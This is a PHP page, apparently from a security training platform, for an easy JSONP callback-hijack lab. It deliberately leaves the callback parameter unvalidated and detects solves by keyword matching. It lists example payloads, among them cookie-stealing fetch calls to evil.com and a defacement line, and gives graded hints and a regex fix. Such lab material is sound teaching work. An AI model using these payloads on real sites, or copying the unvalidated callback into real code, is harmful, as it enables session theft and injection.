<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['JSONP']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// Session Initialization
if (!isset($_SESSION['jsonp_case1_attempts'])) {
  $_SESSION['jsonp_case1_attempts'] = 0;
}
if (!isset($_SESSION['jsonp_case1_solved'])) {
  $_SESSION['jsonp_case1_solved'] = false;
}

// VULNERABLE: Unvalidated callback parameter
$callback = $_GET['callback'] ?? 'callback';
$data = ['status' => 'ok', 'message' => 'Hello from JSONP endpoint'];

$flag_triggered = false;
if (isset($_GET['callback'])) {
  $cb = $_GET['callback'];
  // Check for malicious callback patterns
  if (
    stripos($cb, 'alert') !== false ||
    stripos($cb, 'eval') !== false ||
    stripos($cb, 'Function') !== false ||
    stripos($cb, 'fetch') !== false ||
    stripos($cb, 'XMLHttpRequest') !== false ||
    stripos($cb, 'document.cookie') !== false ||
    stripos($cb, '<script>') !== false
  ) {
    $flag_triggered = true;
  }
}

// Solve Detection
$success_msg = null;
$already_solved = $_SESSION['jsonp_case1_solved'];

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['jsonp_case1_attempts']++;
  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }
  $_SESSION['jsonp_case1_solved'] = true;
  $already_solved = true;
  $success_msg = "Excellent! You've successfully hijacked a JSONP callback. By injecting malicious JavaScript through the callback parameter, you executed arbitrary code in the victim's domain context!";
}

if (isset($_GET['callback'])) {
  $_SESSION['jsonp_case1_attempts']++;
}

$attempts = $_SESSION['jsonp_case1_attempts'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>JSONP API - JSONP Case 1 (Basic Callback Hijack)</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/JSONP-CASE1.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to JSONP Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge easy"><i class="fas fa-seedling"></i> Easy Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-broadcast-tower"></i> JSONP API Endpoint</h1>
      <p class="lab-description">Test our JSONP API. This easy challenge has an <strong>unvalidated callback
          parameter</strong>. Hijack the callback to execute arbitrary JavaScript!</p>
    </div>

    <?php if ($already_solved): ?>
    <div class="success-alert solved-banner">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Already Solved!</h3>
        <p>You have already exploited this Basic Callback Hijack vulnerability.</p>
      </div>
    </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
    <div class="success-alert">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Completed!</h3>
        <p><?php echo $success_msg; ?></p>
      </div>
    </div>
    <?php endif; ?>

    <!-- API Status -->
    <div class="api-status-bar">
      <div class="api-indicator">
        <i class="fas fa-plug"></i>
        <span>Endpoint: <strong>Active</strong></span>
      </div>
      <div class="callback-indicator">
        <i class="fas fa-code"></i>
        <span>Callback: <code><?php echo htmlspecialchars($callback); ?></code></span>
      </div>
      <?php if ($flag_triggered): ?>
      <div class="exploit-indicator">
        <i class="fas fa-skull-crossbones"></i>
        <span>EXPLOIT DETECTED!</span>
      </div>
      <?php endif; ?>
    </div>

    <!-- Main Grid -->
    <div class="jsonp-grid">

      <!-- Callback Tester -->
      <div class="jsonp-card tester-card">
        <div class="card-header">
          <i class="fas fa-vial"></i>
          <h3>Callback Tester</h3>
          <span class="vuln-badge"><i class="fas fa-unlock"></i> Unvalidated</span>
        </div>
        <div class="tester-content">
          <p class="tester-info">The API accepts any callback name without validation:</p>
          <div class="endpoint-box">
            <span class="endpoint-label">Endpoint:</span>
            <code
              class="endpoint-url"><?php echo htmlspecialchars("http://" . $_SERVER['HTTP_HOST'] . strtok($_SERVER['REQUEST_URI'], '?')); ?>?callback=<span class="highlight">YOUR_FUNCTION</span></code>
          </div>
          <div class="curl-examples">
            <div class="curl-item">
              <span class="curl-label">Normal:</span>
              <code class="curl-code">?callback=myFunction</code>
            </div>
            <div class="curl-item">
              <span class="curl-label">Malicious:</span>
              <code class="curl-code">?callback=alert(1)</code>
            </div>
            <div class="curl-item">
              <span class="curl-label">Data Theft:</span>
              <code class="curl-code">?callback=fetch("//evil.com?c="+document.cookie)</code>
            </div>
          </div>
        </div>
      </div>

      <!-- Live Response -->
      <div class="jsonp-card response-card">
        <div class="card-header">
          <i class="fas fa-terminal"></i>
          <h3>Live Response</h3>
        </div>
        <div class="response-content">
          <div class="response-label">Current JSONP Response:</div>
          <pre
            class="response-code"><code><?php echo htmlspecialchars($callback); ?>(<?php echo json_encode($data, JSON_PRETTY_PRINT); ?>);</code></pre>
          <div class="response-warning">
            <i class="fas fa-exclamation-triangle"></i>
            <span>The callback name is injected directly into the response without sanitization!</span>
          </div>
        </div>
      </div>

      <!-- Vulnerability Analysis -->
      <div class="jsonp-card analysis-card">
        <div class="card-header">
          <i class="fas fa-microscope"></i>
          <h3>Vulnerability Analysis</h3>
        </div>
        <div class="analysis-content">
          <div class="analysis-item">
            <span class="analysis-label">Callback Validation:</span>
            <code class="analysis-code">// None - accepts any string</code>
            <span class="analysis-status vuln"><i class="fas fa-times-circle"></i> Missing</span>
          </div>
          <div class="analysis-item">
            <span class="analysis-label">Character Filtering:</span>
            <code class="analysis-code">// No filtering applied</code>
            <span class="analysis-status vuln"><i class="fas fa-times-circle"></i> None</span>
          </div>
          <div class="analysis-item">
            <span class="analysis-label">Secure Approach:</span>
            <code class="analysis-code">preg_match('/^[a-zA-Z_][a-zA-Z0-9_]*$/', $callback)</code>
            <span class="analysis-status safe"><i class="fas fa-check-circle"></i> Required</span>
          </div>
        </div>
      </div>

      <!-- Payload Examples -->
      <div class="jsonp-card payloads-card">
        <div class="card-header">
          <i class="fas fa-bolt"></i>
          <h3>Callback Hijack Payloads</h3>
        </div>
        <div class="payloads-list">
          <div class="payload-item">
            <div class="payload-name">Basic Alert</div>
            <code class="payload-code">?callback=alert(1)</code>
            <span class="payload-target">Execute alert in victim domain</span>
          </div>
          <div class="payload-item">
            <div class="payload-name">Cookie Stealer</div>
            <code class="payload-code">?callback=eval("fetch('//evil.com?c='+document.cookie)")</code>
            <span class="payload-target">Exfiltrate session cookies</span>
          </div>
          <div class="payload-item">
            <div class="payload-name">DOM Manipulation</div>
            <code class="payload-code">?callback=document.body.innerHTML="&lt;h1&gt;HACKED&lt;/h1&gt;"</code>
            <span class="payload-target">Deface the page</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Debug Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Current Request</span>
      </div>
      <div class="debug-body">
        <code><?php echo $_SERVER['REQUEST_METHOD']; ?> <?php echo $_SERVER['REQUEST_URI']; ?></code>
        <div class="request-details">
          <span>Callback: <?php echo htmlspecialchars($callback); ?></span>
          <span>Flag Triggered: <?php echo $flag_triggered ? 'YES' : 'NO'; ?></span>
          <span>Attempts: <?php echo $attempts; ?></span>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
      <div class="hint-text">The callback parameter is reflected directly in the response. Try adding
        <code>?callback=alert(1)</code> to the URL. The server will return <code>alert(1)({"status":"ok"...});</code>
        which executes immediately!</div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
      <div class="hint-text">Any JavaScript code works as a callback. Try <code>?callback=eval("alert('HACKED')")</code>
        or <code>?callback=console.log</code>. The JSONP response becomes executable JavaScript!</div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
    <div class="hint-box hint-final">
      <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
      <div class="hint-text">Simply add <code>?callback=alert(document.domain)</code> to the URL. This executes in the
        context of the current domain, proving full JavaScript execution capability!</div>
    </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
  window.addEventListener('load', function() {
    const exploitIndicator = document.querySelector('.exploit-indicator');
    const alreadySolved = document.querySelector('.solved-banner');
    if (exploitIndicator && !alreadySolved) {
      document.getElementById('solved-flag').value = '1';
      document.getElementById('success-form').submit();
    }
  });
  </script>
</body>

</html>